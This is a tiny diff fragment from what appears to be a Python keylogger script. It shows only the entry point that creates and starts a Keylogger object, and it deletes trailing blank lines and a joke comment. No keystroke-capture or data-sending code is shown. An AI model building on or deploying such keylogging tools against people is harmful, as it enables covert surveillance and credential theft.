@@ -62,6 +62,3 @@ if __name__ == '__main__':
     keylogger = Keylogger()
     keylogger.start()
 
-
-
-# promise is a good boy
